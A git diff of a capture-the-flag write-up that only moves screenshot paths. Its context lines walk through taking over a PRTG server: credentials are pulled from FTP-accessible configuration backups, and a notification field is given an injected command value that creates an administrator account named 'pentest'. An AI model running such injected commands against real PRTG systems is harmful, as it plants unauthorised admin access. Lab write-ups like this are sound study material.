@@ -171,14 +171,14 @@ Returning to FTP, we explored hidden files:
 ls -la
 ```
 
-![hidden_files](hidden_files.png)
+![hidden_files](screenshots/hidden_files.png)
 
 Inside `ProgramData`, configuration files were found:
 
 - `PRTG Configuration.dat`  
 - `PRTG_Configuration.old.bak`  
 
-![program_data](program_data.png)
+![program_data](screenshots/program_data.png)
 
 Downloaded both:
 
@@ -187,7 +187,7 @@ get "PRTG Configuration.dat"
 get "PRTG Configuration.old.bak"
 ```
 
-![download_prtg_config](download_prtg_config.png)
+![download_prtg_config](screenshots/download_prtg_config.png)
 
 Let's compare the two files to check differences:
 
@@ -197,14 +197,14 @@ diff "PRTG Configuration.dat" "PRTG Configuration.old.bak"
 
 From the backup configuration file, valid credentials were extracted:
 
-![prtg_credentials](prtg_credentials.png)
+![prtg_credentials](screenshots/prtg_credentials.png)
 
 These credentials don't work, but this machine was created in 2019, so the password likely follows a yearly rotation pattern:
 
 - **Username:** `prtgadmin`  
 - **Password:** `PrTg@dmin2019`
 
-![prtg_web_login](prtg_web_login.png)
+![prtg_web_login](screenshots/prtg_web_login.png)
 
 Successful login.
 
@@ -223,8 +223,8 @@ test.txt;net user pentest p3nT3st! /add; net localgroup Administrators pentest /
 
 Inside PRTG â†’ `Setup > Notifications`, a new notification was created:
 
-![prtg_notifications](prtg_notifications.png)  
-![prtg_new_notification](prtg_new_notification.png)
+![prtg_notifications](screenshots/prtg_notifications.png)  
+![prtg_new_notification](screenshots/prtg_new_notification.png)
 
 Before execution, validated that the user `pentest` did not exist:
 
@@ -232,16 +232,16 @@ Before execution, validated that the user `pentest` did not exist:
 crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
 ```
 
-![crackmapexec_pentest](crackmapexec_pentest.png)
+![crackmapexec_pentest](screenshots/crackmapexec_pentest.png)
 
 Ran the notification manually:
 
-![prtg_notification_run](prtg_notification_run.png)  
-![prtg_notification_runned](prtg_notification_runned.png)
+![prtg_notification_run](screenshots/prtg_notification_run.png)  
+![prtg_notification_runned](screenshots/prtg_notification_runned.png)
 
 Confirmed user creation:
 
-![crackmapexec_pwn3d](crackmapexec_pwn3d.png)
+![crackmapexec_pwn3d](screenshots/crackmapexec_pwn3d.png)
 
 ---
 ## 4. Privilege Escalation
